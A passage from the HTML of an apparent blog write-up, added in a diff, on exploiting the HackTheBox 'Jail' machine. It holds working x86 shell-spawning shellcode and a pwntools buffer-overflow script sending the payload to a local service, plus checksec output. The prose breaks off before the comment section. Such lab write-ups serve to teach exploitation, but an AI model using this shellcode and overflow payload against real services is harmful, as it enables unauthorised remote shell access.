+<span class="n">buf</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80</span><span class="s2">&quot;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6</span><span class="s2">&quot;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e</span><span class="s2">&quot;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x89\xe3\x31\xc9\xcd\x80</span><span class="s2">&quot;</span>
+
+<span class="k">try</span><span class="p">:</span>
+
+    <span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">28</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xffbe25f0</span> <span class="o">+</span> <span class="mi">32</span><span class="p">)</span> <span class="o">+</span> <span class="n">buf</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">7411</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;DEBUG&#39;</span><span class="p">)</span>
+    <span class="nb">print</span> <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;USER admin&#39;</span><span class="p">)</span>
+    <span class="nb">print</span> <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;PASS &#39;</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+
+<span class="k">except</span><span class="p">:</span>
+        <span class="nb">print</span> <span class="s2">&quot;Could not connect to Jail!&quot;</span>
+</pre></div>
+
+
+<p>AAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC</p>
+<p>Now before we try to get a shell, the <code>checksec</code> command can tell us if there is any protection mechanism in place we need to be aware:</p>
+<div class="highlight"><pre><span></span><span class="go">gef➤  checksec</span>
+<span class="go">[+] checksec for &#39;/home/m4rc0ff/Documents/htbBoxes/jail/jail&#39;</span>
+<span class="go">Canary                        : ✘ </span>
+<span class="go">NX                            : ✘ </span>
+<span class="go">PIE                           : ✘ </span>
+<span class="go">Fortify                       : ✘ </span>
+<span class="go">RelRO                         : Partial</span>
+</pre></div>
+
+
+<p>Seems like we should be ok as only <code>RelRO</code> is partially enabled. </p>
+<p>I generate a random pattern within <code>gdb</code>:</p>
+			<style>
+#pcs-comment-form input,
+#pcs-comment-form textarea {
+	width: 100%;
+}
+#pcs-comment-form-display-replyto {
+	border: solid 1px black;
+	padding: 2px;
+}
+#pcs-comment-form-display-replyto p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+#pcs-comments ul {
+	list-style: none;
+}
+#pcs-comments .comment-left {
+	display: table-cell;
+	padding-right: 10px;
+}
+#pcs-comments .comment-body {
+	display: table-cell;
+	vertical-align: top;
+	width: 100%;
+}
+</style>
+
+	<section id="pcs-comments">
+	<header>
+		<h2>Comments</h2>
+		<hr/>
+	</header>
+		<p>There are no comments yet.</p>
+	<section>
+	<form id="pcs-comment-form" action="#">
+		<legend>Add a Comment</legend>
+		<input type="hidden" id="pcs-comment-form-input-replyto">
+		<fieldset>
+			<label for="pcs-comment-form-input-name">Name</label>
+			<input  id="pcs-comment-form-input-name" type="text" placeholder="Enter your name or nickname" />
+		</fieldset>
+		<fieldset>
+			<label for="pcs-comment-form-input-website">Website</label>
+			<input  id="pcs-comment-form-input-website" type="text" placeholder="Enter your website (optional)" />
+		</fieldset>
+		<fieldset>
+			<label   for="pcs-comment-form-input-textarea">Your Comment</label>
+			<textarea id="pcs-comment-form-input-textarea" rows="5" style="resize:vertical;" placeholder="Your comment"></textarea>
+			<p>You can use the <a href="https://en.wikipedia.org/wiki/Markdown">Markdown</a> syntax to format your comment.</p>
+			<div style="display: none; " id="pcs-comment-form-display-replyto"></div>
+		</fieldset>
+
+		<button type="submit"
+				id="pcs-comment-form-button-submit"
+				>Post via email</button>
+
+			<a href="http://127.0.0.1:8000/feeds/comment.Jail.atom.xml">
+				Comment Atom Feed
+			</a>
+	</form>
+</section>
+
+</section>
+
+			<script type="text/javascript" src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+	<script type="text/javascript" src="http://127.0.0.1:8000/theme/js/comments.js"></script>
+	<script type="text/javascript">
+		$(document).ready(function() {
+			CommentSystem.email_user   = "sittingducks.io";
+			CommentSystem.email_domain = "protonmail.com";
+			CommentSystem.display_replyto_html = function(comment_content, article_slug, author) { 
+				return ''
+					+ '<button style="float:right;" onclick="CommentSystem.cancelReply(); return false;" title="Cancel the reply">'
+					+ 	'×'
+					+ '</button>'
+					+ '<p>This comment will be posted as a reply to \'<a title="'+comment_content+'" href="#comment-'+article_slug+'">'+author+'</a>\'</p>';
+			};
+
+			$('#pcs-comment-form').on("submit",
+				function( event )
+				{
+					event.preventDefault();
+					$(location).attr('href', CommentSystem.getMailtoLink("Jail"));
+				}
+			);
+		});
+	</script>
+
+
+      </div><!-- .entry-content -->
+      <br /><br />
+      <div class="article_meta">
+        Tags:
+          <a href="http://127.0.0.1:8000/tag/hackthebox.html">HackTheBox</a>      </div>
+    </div>
+  </div>
+</article><!-- #post-## -->
+                </div>
+              </div><!-- #main -->
+          </div><!-- #primary -->
+        </div>
+      </div><!-- close .row -->
+    </div><!-- close .container -->
+  </div><!-- close .site-content -->
+
+
+
+
+  <div id="footer-area">
+    <footer id="colophon" class="site-footer" role="contentinfo">
+      <div class="site-info container">
+        <div class="row">
+                    <div class="copyright col-md-12">
+                    <a href="http://127.0.0.1:8000/pages/privacy-policy">Privacy Policy</a> | 
+                    <a href="http://127.0.0.1:8000/feeds/all.atom.xml">Atom Feed</a> | 
+                    <a href="http://127.0.0.1:8000/sitemap.xml">Sitemap</a><br />
+                    &copy; 2019 <a href="http://127.0.0.1:8000">Marco Meli</a> </div>
+        </div>
+      </div><!-- .site-info -->
+      <div class="scroll-to-top" style="display: none;"><i class="fa fa-angle-up"></i></div><!-- .scroll-to-top -->
+    </footer><!-- #colophon -->
+  </div>
+
+  <script type="text/javascript">
+    window.addEventListener('load', function(){
+    if (window.location.pathname != '/' && window.location.pathname != '/index.html'){
+      window.scroll(0, document.getElementById('main').offsetTop);
+    }})
+  </script>
+
+  
+ <!-- <script src="http://127.0.0.1:8000/theme/js/jquery.min.js"></script> -->
+	<!-- Make sure jquery is loaded first, then load colorbox -->
+  <script src="http://127.0.0.1:8000/theme/js/jquery.colorbox-min.js"></script>
+  <script src="http://127.0.0.1:8000/theme/js/load-colorbox.js"></script>
+
+
+  
+  
+</body>
+</html>
